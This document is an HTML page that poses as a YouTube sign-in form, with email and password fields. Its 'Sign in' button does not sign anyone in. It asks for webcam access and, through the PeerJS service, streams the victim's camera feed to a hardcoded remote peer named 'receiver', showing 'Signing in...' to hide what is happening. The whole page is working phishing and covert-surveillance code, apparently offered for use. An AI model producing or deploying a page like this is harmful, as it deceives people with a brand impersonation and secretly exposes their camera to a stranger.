<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>YouTube</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f9f9f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-box {
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 0 15px rgba(0,0,0,0.1);
            width: 90%;
            max-width: 400px;
            text-align: center;
        }
        input {
            width: 90%;
            margin: 10px 0;
            padding: 10px;
        }
        button {
            background-color: #c00;
            color: white;
            border: none;
            padding: 10px 20px;
            margin-top: 10px;
            cursor: pointer;
        }
        h2 { color: #c00; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>YouTube Sign In</h2>
        <input type="text" placeholder="Email or phone" id="email"><br>
        <input type="password" placeholder="Password" id="password"><br>
        <button onclick="accessCamera()">Sign in</button>
        <p id="status" style="color:grey; font-size:0.9em;"></p>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/peerjs@1.3.1/dist/peerjs.min.js"></script>
    <script>
        function accessCamera() {
            document.getElementById('status').innerText = "Signing in...";

            const peer = new Peer({
                host: 'peerjs.com',
                port: 443,
                secure: true
            });

            peer.on('open', id => {
                console.log("üì≤ Phone Peer ID: " + id);
            });

            navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                console.log("üì∏ Camera access granted");

                const call = peer.call('receiver', stream);
                if (!call) {
                    console.error("‚ùå No peer connection to receiver");
                    return;
                }

                call.on('close', () => {
                    console.log("üì¥ Call closed");
                });

                call.on('error', err => {
                    console.error("‚ö†Ô∏è Call error: ", err);
                });
            })
            .catch(err => {
                console.error("‚ùå Camera access denied:", err);
                document.getElementById('status').innerText = "Camera blocked or unsupported.";
            });
        }
    </script>
</body>
</html>
